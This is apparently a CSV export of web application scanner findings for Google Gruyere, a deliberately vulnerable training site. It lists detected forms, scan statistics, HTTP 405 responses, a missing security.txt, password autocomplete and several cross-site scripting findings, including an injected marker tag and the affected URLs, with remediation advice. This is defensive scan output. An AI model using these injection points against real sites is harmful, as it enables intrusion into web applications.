asset.id,asset.name,"definition.cvss2.base_score","definition.cvss2.base_vector","definition.cvss3.base_score","definition.cvss3.base_vector",definition.description,definition.family,definition.id,definition.name,"definition.patch_published","definition.plugin_published","definition.plugin_updated",definition.references,definition.see_also,definition.severity,definition.solution,"definition.vulnerability_published",finding_id,first_observed,last_observed,output,risk_modified,severity,state
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner has detected the presence of a form during the crawling of the target web application. Details about the form are provided in the plugin output.","Web Applications",98148,"Form Detected",,2021-10-21T00:00:00Z,2021-10-21T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"00294dcf-55f7-4079-b10a-75188d349d66",2022-03-15T21:06:17.432Z,2022-03-15T15:27:50Z,"A form with no identifier has been detected on the following URL https://google-gruyere.appspot.com/resetbutton/656501648683287335357107855369111942818 with input fields : 
- g-recaptcha-response (no type specified)

This form is submitted by using the following action : https://google-gruyere.appspot.com/resetbutton/656501648683287335357107855369111942818",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"Provides scan information and statistics of plugins run.",General,98000,"Scan Information",,2017-03-31T00:00:00Z,2017-03-31T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]",,Info,,,"01a076e6-6cd7-4d04-b739-8f8af19ceebe",2022-03-15T18:42:41.743Z,2022-03-15T18:42:40Z,"
Engine Version      1.24.0-575
Scan ID             798cc6ee-419f-40b1-b710-59cb8e5c7325

Start Time          2022-03-15 16:42:35 +0000
Duration            02:00:02

Requests            116241
Crawler Requests    17668
Requests/s          23.584
Mean Response Time  0.5426s

Bandwidth Usage
- Data to Target    55.1 MB
- Data from Target  263 MB

Timeouts Encountered
Network Timeouts    775
Browser Timeouts    0

Browser Respawns    0

HTTP Protocols Detected
- HTTP
- HTTPs


Authentication Identified
- None


Plugins
- 364 have been included per scan policy
- 304 have been started based on target information collected

List of plugins is available in 'plugins.csv' attachment.


Settings used to conduct this scan are available in 'configuration.csv' attachment.
",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into the requested PATH and have it returned in the server's response. For example `HTTP://yoursite.com/INJECTION_HERE/`, where `INJECTION_HERE` represents the location where the scanner payload was injected.","Cross Site Scripting",98107,"Cross-Site Scripting (XSS) in path",,2017-03-31T00:00:00Z,2021-11-26T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"02250bc4-ba6e-42a3-8968-8c5b1b82adbc",2022-03-15T18:42:41.743Z,2022-03-15T17:00:39Z,"Vulnerability has been detected on URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/snippets.gtl?uid=cheddar' by exploiting 'path' element named 'xss_path' and injecting following payload:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

To confirm the presence of the vulnerability, this proof has been identified in the target response:

 | <my_tag_798cc6ee-419f-40b1-b710-59cb8e5c7325/>

The information used to check the vulnerability have been provided in attachment.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"02927c4f-4a7d-409a-8dcb-e22d7b5856df",2022-03-15T18:42:41.743Z,2022-03-15T16:59:56Z,"A response has been received with a response code '405' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP TRACE request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/newsnippet.gtl'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"A Security.txt file has not been detected on the target.

When security risks in web services are discovered by independent security researchers, this file defines the channels to disclose them properly & enables 3rd party researchers to disclose issues securely in a manner defined by the organization.

Organizations should consider creating a security.txt file containing contact and other information in the defined format and place it under the .well-known directory of the server.","Web Servers",112723,"Security.txt File Not Detected",,2021-03-17T00:00:00Z,2021-03-17T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","https://securitytxt.org/, https://tools.ietf.org/html/draft-foudil-securitytxt-11",Info,,,"02ea5d49-181d-4406-a877-e8eb06aac0c6",2022-03-15T18:42:41.743Z,2022-03-15T16:44:49Z,"No or a malformed security.txt was found at http://google-gruyere.appspot.com/.well-known/security.txt",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",2.6,"CVSS2#AV:N/AC:H/Au:N/C:P/I:N/A:N",3.1,"CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N","In typical form-based web applications, it is common practice for developers to allow `autocomplete` within the HTML form to improve the usability of the page. With `autocomplete` enabled (default), the browser is allowed to cache previously entered form values.

For legitimate purposes, this allows the user to quickly re-enter the same data when completing the form multiple times.

When `autocomplete` is enabled on either/both the username and password fields, this could allow a cyber-criminal with access to the victim's computer the ability to have the victim's credentials automatically entered as the cyber-criminal visits the affected page.

Scanner has discovered that the affected page contains a form containing a password field that has not disabled `autocomplete`.","Authentication & Session",98081,"Password Field With Auto-Complete",,2017-03-31T00:00:00Z,2022-03-03T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A6], owasp_2013=[A5], owasp_2017=[A6], owasp_2021=[A5], cwe=[16], cve=[], cpe=[], wasc=[Application Misconfiguration], bid=[]","https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OTG-AUTHN-005)",Low,"The `autocomplete` value can be configured in two different locations.
The first and most secure location is to disable the `autocomplete` attribute on the `<form>` HTML tag. This will disable `autocomplete` for all inputs within that form. An example of disabling `autocomplete` within the form tag is `<form autocomplete=off>`.
The second slightly less desirable option is to disable the `autocomplete` attribute for a specific `<input>` HTML tag. While this may be the less desired solution from a security perspective, it may be preferred method for usability reasons, depending on size of the form. An example of disabling the `autocomplete` attribute within a password input tag is `<input type=password autocomplete=off>`.",,"030cc841-6c65-4733-9225-fe9202974eab",2022-03-15T21:06:17.432Z,2022-03-15T19:58:11Z,"The following form has been found to have not restricted Password Auto Complete:

<form method=""get"" action=""/656501648683287335357107855369111942818/saveprofile"">
  <input type=""hidden"" name=""action"" value=""new"">
  </input>
  <input type=""text"" name=""uid"" value="""" maxlength=""16"">
  </input>
  <input type=""password"" name=""pw"">
  </input>
  <input type=""hidden"" name=""is_author"" value=""True"">
  </input>
  <input type=""submit"" value=""Create account"">
  </input>
</form>
",NONE,Low,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"03956c83-eb3d-4fc7-a533-29f14d17b702",2022-03-15T21:06:17.432Z,2022-03-15T14:00:35Z,"A response has been received with a response code '405' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP PUT request made on the URL 'http://google-gruyere.appspot.com/361357029172560933265350706939995878846/editprofile.gtl'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",,,,,"The scanner identified some responses with a status code other than the usual 200 (OK), 301 (Moved Permanently), 302 (Found) and 404 (Not Found) codes. These codes can provide useful insights into the behavior of the web application and identify any unexpected responses to be addressed.","Web Applications",98050,"Interesting response",,2017-03-31T00:00:00Z,2021-06-14T00:00:00Z,"owasp_api_2019=[], owasp_2010=[], owasp_2013=[], owasp_2017=[], owasp_2021=[], cwe=[], cve=[], cpe=[], wasc=[], bid=[]","http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html, https://en.wikipedia.org/wiki/List_of_HTTP_status_codes",Info,,,"04bb9495-e014-4511-87b3-469b98740745",2022-03-15T18:42:41.743Z,2022-03-15T18:03:22Z,"A response has been received with a response code '405' which may require further investigation to verify if this response is due to an abnormal behavior of the target.

The response has been triggered by an HTTP TRACE request made on the URL 'https://google-gruyere.appspot.com/start'.",NONE,Info,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"0550aeb5-c864-44e1-8a6d-b598f263f884",2022-03-15T21:06:17.432Z,2022-03-15T14:01:13Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
"44144ffd-3943-415c-8326-24265f25e15d","google-gruyere.appspot.com",5.8,"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:N",6.1,"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N","Client-side scripts are used extensively by modern web applications. They perform from simple functions (such as the formatting of text) up to full manipulation of client-side data and Operating System interaction.

Cross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, from the client) and reusing it without performing any validation or sanitisation.

If the injected script is returned immediately this is known as reflected XSS. If the injected script is stored by the server and returned to any client visiting the affected page, then this is known as persistent XSS (also stored XSS).

Scanner has discovered that it is possible to insert script content directly into HTML element content.","Cross Site Scripting",98104,"Cross-Site Scripting (XSS)",,2017-03-31T00:00:00Z,2022-06-23T00:00:00Z,"owasp_api_2019=[API7], owasp_2010=[A2], owasp_2013=[A3], owasp_2017=[A7], owasp_2021=[A3], cwe=[79], cve=[], cpe=[], wasc=[Cross-Site Scripting], bid=[]","http://projects.webappsec.org/w/page/13246920/Cross%20Site%20Scripting, https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet",Medium,"To remedy XSS vulnerabilities, it is important to never use untrusted or unfiltered data within the code of a HTML page.
Untrusted data can originate not only form the client but potentially a third party or previously uploaded file etc.
Filtering of untrusted data typically involves converting special characters to their HTML entity encoded counterparts (however, other methods do exist, see references). These special characters include:
* `&` * `<` * `>` * `'` * `'` * `/`
An example of HTML entity encoding is converting `<` to `&lt;`.
Although it is possible to filter untrusted input, there are five locations within an HTML page where untrusted input (even if it has been filtered) should never be placed:
1. Directly in a script. 2. Inside an HTML comment. 3. In an attribute name. 4. In a tag name. 5. Directly in CSS.
Each of these locations have their own form of escaping and filtering.
_Because many browsers attempt to implement XSS protection, any manual verification of this finding should be conducted using multiple different browsers and browser versions._",,"05c98643-c5d0-41b5-94df-416766e019ee",2022-03-15T21:06:17.432Z,2022-03-15T17:14:27Z,"The scanner was able to exploit a Cross-Site Scripting by injecting a custom payload and getting a javascript code execution.",NONE,Medium,ACTIVE
